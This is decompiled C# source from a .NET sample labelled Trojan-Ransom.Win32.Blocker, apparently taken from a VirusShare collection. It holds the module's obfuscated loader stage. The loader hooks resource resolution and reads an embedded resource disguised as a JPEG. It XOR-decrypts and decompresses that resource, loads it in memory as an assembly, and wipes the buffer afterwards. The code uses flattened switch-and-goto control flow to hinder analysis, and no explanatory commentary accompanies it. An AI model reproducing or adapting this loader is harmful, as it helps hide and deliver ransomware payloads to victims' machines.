// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: Asphixere, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 212CDB31-C311-4C28-8A08-1D4D679CB4BE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.nlf-4e8b94742222b9ac74a0769c9ee7ab0433ff1c6728b785438461aa624d50d26d.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

internal class \u003CModule\u003E
{
  static Assembly ὓⳲ뵐橁돉郲䱝\u2AA0;

  static \u003CModule\u003E()
  {
label_0:
    AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.ᆒ뙢ᛒ\uF6D1\uFFFD皝㲓ꖏ);
    switch (1)
    {
      case 0:
        goto label_0;
    }
  }

  internal static Assembly ᆒ뙢ᛒ\uF6D1\uFFFD皝㲓ꖏ(object sender, ResolveEventArgs args)
  {
label_0:
    while ((object) \u003CModule\u003E.ὓⳲ뵐橁돉郲䱝\u2AA0 == null)
    {
      int num1 = 1;
label_2:
      int num2;
      BinaryReader binaryReader;
      while (true)
      {
        int num3;
        int index;
        Stream manifestResourceStream;
        byte[] buffer;
        byte num4;
        switch (num1)
        {
          case 0:
            goto label_0;
          case 2:
          case 4:
          case 7:
label_13:
            switch (num2)
            {
              case 0:
                goto label_0;
              case 1:
                goto label_24;
              case 2:
                goto label_20;
              case 3:
                goto label_17;
              case 4:
                goto label_7;
              case 5:
                num4 = (byte) (-1032614265 - 1227829148 - 2034523785);
                num1 = 12;
                num3 = 23;
                break;
              default:
                num3 = 17;
                break;
            }
            break;
          case 3:
label_10:
            if (index >= buffer.Length)
            {
              num1 = 9;
              num3 = 2;
              break;
            }
            goto label_20;
          case 5:
            num2 = 1;
            num3 = 11;
            break;
          case 6:
label_17:
            manifestResourceStream = typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("㜪ろ鯳産\uE61E\uF837ጶ琣.jpg");
            num3 = 5;
            break;
          case 8:
label_24:
            num4 = (byte) ((int) num4 * (1454642038 ^ 250849231 ^ 866852227 ^ 831860299 ^ 1517913944) % 256);
            num3 = 4;
            break;
          case 9:
label_18:
            binaryReader = new BinaryReader((Stream) new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress));
            goto case 13;
          case 10:
label_7:
            ++index;
            num1 = 3;
            num3 = 10;
            break;
          case 11:
label_27:
            num2 = 4;
            num3 = 16;
            break;
          case 12:
label_25:
            index = 0;
            goto case 3;
          case 13:
label_12:
            num3 = 19;
            break;
          case 14:
            num2 = 5;
            goto case 2;
          default:
            num2 = 3;
            num3 = 13;
            break;
        }
label_4:
        while (true)
        {
          switch (num3)
          {
            case 0:
              goto label_0;
            case 2:
            case 8:
            case 10:
            case 21:
            case 22:
            case 23:
              goto label_2;
            case 3:
              goto label_7;
            case 4:
              num1 = 11;
              num3 = 22;
              continue;
            case 5:
              buffer = new byte[manifestResourceStream.Length];
              num3 = 9;
              continue;
            case 6:
              goto label_10;
            case 7:
              goto label_12;
            case 9:
              manifestResourceStream.Read(buffer, 0, buffer.Length);
              num3 = 15;
              continue;
            case 11:
              goto label_16;
            case 12:
              goto label_18;
            case 13:
              goto label_13;
            case 14:
            case 19:
              goto label_28;
            case 15:
              num1 = 14;
              num3 = 8;
              continue;
            case 16:
              num1 = 2;
              num3 = 21;
              continue;
            case 17:
              goto label_23;
            case 18:
              goto label_25;
            case 20:
              goto label_27;
            default:
              goto label_5;
          }
        }
label_5:
        num1 = 5;
        continue;
label_16:
        num1 = 4;
        continue;
label_23:
        num1 = 8;
        continue;
label_20:
        buffer[index] = (byte) ((uint) buffer[index] ^ (uint) num4);
        num3 = 1;
        goto label_4;
      }
label_28:
label_29:
      try
      {
        byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
        int num5 = 7;
        while (true)
        {
          switch (num5)
          {
            case 0:
              goto label_29;
            case 2:
              num2 = 1;
              num5 = 5;
              continue;
            case 3:
              goto label_35;
            case 4:
            case 6:
label_32:
              switch (num2)
              {
                case 0:
                  goto label_29;
                case 1:
                  goto label_35;
                case 2:
                  break;
                default:
                  num5 = 3;
                  continue;
              }
              break;
            case 5:
              num1 = 4;
              goto default;
            case 7:
              num1 = 3;
              goto default;
            default:
              switch (num1)
              {
                case 0:
                  goto label_29;
                case 2:
                  break;
                case 3:
                  num2 = 2;
                  num5 = 6;
                  continue;
                default:
                  goto label_32;
              }
              break;
          }
          \u003CModule\u003E.ὓⳲ뵐橁돉郲䱝\u2AA0 = Assembly.Load(numArray);
          num5 = 2;
        }
label_35:
        Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
        break;
      }
      finally
      {
        binaryReader?.Dispose();
      }
    }
label_43:
    int num6 = Array.IndexOf<string>(\u003CModule\u003E.ὓⳲ뵐橁돉郲䱝\u2AA0.GetManifestResourceNames(), args.Name);
    int num7 = 1;
    int num8 = 1;
    if (num6 == -1)
      num8 = 2;
    switch (num8)
    {
      case 0:
        goto label_43;
      case 2:
        num7 = 2;
        break;
    }
    switch (num7)
    {
      case 0:
        goto label_43;
      case 2:
        return (Assembly) null;
      default:
        return \u003CModule\u003E.ὓⳲ뵐橁돉郲䱝\u2AA0;
    }
  }
}
